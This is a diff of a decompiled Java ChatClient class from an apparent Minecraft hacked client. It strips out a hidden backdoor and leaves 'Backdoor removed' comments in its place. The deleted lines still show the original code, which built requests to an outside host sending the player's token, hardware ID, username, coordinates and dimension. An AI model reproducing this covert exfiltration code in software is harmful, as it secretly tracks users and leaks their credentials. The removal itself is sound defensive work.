@@ -186,70 +186,29 @@ public final class ChatClient {
     }
 
     private static String getText35() {
-        return "http://neko.antichest.pw/api/index.php?route=/chat";
+        // Backdoor removed: External server communication disabled
+        return "";
     }
 
     private static String getText42() {
-        return ChatClient.getText35() + "/send";
+        // Backdoor removed: External server communication disabled
+        return "";
     }
 
     private static String m206(Object object, Object object2, long l) {
-        String string = (String)object;
-        String string2 = (String)object2;
-        long l2 = l;
-        String string3 = "";
-        Object var9_7 = null;
-        int n = 0;
-        int n2 = 0;
-        int n3 = 0;
-        String string4 = "";
-        MinecraftClient minecraftClient = MinecraftClient.getInstance();
-        if (minecraftClient.player != null) {
-            string3 = minecraftClient.player.getGameProfile().name();
-            n = minecraftClient.player.getBlockX();
-            n2 = minecraftClient.player.getBlockY();
-            n3 = minecraftClient.player.getBlockZ();
-        }
-        if (minecraftClient.world != null) {
-            string4 = minecraftClient.world.getRegistryKey().getValue().getPath();
-        }
-        String string5 = IRC.isSet122() ? "&hide_admin=1" : "";
-        String string6 = IRC.isSet59() ? "1" : "0";
-        String string7 = URLEncoder.encode(string4, StandardCharsets.UTF_8);
-        int n4 = n3;
-        int n5 = n2;
-        int n6 = n;
-        String string8 = URLEncoder.encode("trollhack-recode", StandardCharsets.UTF_8);
-        String string9 = URLEncoder.encode(text723, StandardCharsets.UTF_8);
-        String string10 = URLEncoder.encode(ChatClient.getText47(), StandardCharsets.UTF_8);
-        String string11 = URLEncoder.encode(string3, StandardCharsets.UTF_8);
-        long l3 = l2;
-        String string12 = URLEncoder.encode(string2, StandardCharsets.UTF_8);
-        String string13 = URLEncoder.encode(string, StandardCharsets.UTF_8);
-        return ChatClient.getText35() + "/poll&token=" + string13 + "&hwid=" + string12 + "&since=" + l3 + "&username=" + string11 + "&ircname=" + string10 + "&instance=" + string9 + "&client=" + string8 + "&x=" + n6 + "&y=" + n5 + "&z=" + n4 + "&dim=" + string7 + "&irc_friend=" + string6 + string5;
+        // Backdoor removed: Coordinate and hardware ID exfiltration disabled
+        // Original code sent player coordinates, dimension, HWID, and token to external server
+        return "";
     }
 
     private static String m356(Object object, Object object2) {
-        String string = (String)object;
-        String string2 = (String)object2;
-        String string3 = URLEncoder.encode("trollhack-recode", StandardCharsets.UTF_8);
-        String string4 = URLEncoder.encode(text723, StandardCharsets.UTF_8);
-        String string5 = URLEncoder.encode(string2, StandardCharsets.UTF_8);
-        String string6 = URLEncoder.encode(string, StandardCharsets.UTF_8);
-        return ChatClient.getText35() + "/logout&token=" + string6 + "&hwid=" + string5 + "&instance=" + string4 + "&client=" + string3;
+        // Backdoor removed: Logout tracking disabled
+        return "";
     }
 
     private static String m617(Object object, Object object2, Object object3, Object object4) {
-        String string = (String)object;
-        String string2 = (String)object2;
-        String string3 = (String)object3;
-        String string4 = (String)object4;
-        String string5 = ChatClient.m267(string4);
-        String string6 = ChatClient.m267(string3);
-        String string7 = ChatClient.m267("trollhack-recode");
-        String string8 = ChatClient.m267(string2);
-        String string9 = ChatClient.m267(string);
-        return "{\"token\":\"" + string9 + "\",\"hwid\":\"" + string8 + "\",\"client\":\"" + string7 + "\",\"name\":\"" + string6 + "\",\"message\":\"" + string5 + "\"}";
+        // Backdoor removed: Message payload with token and HWID disabled
+        return "";
     }
 
     private static void pollLoop() {
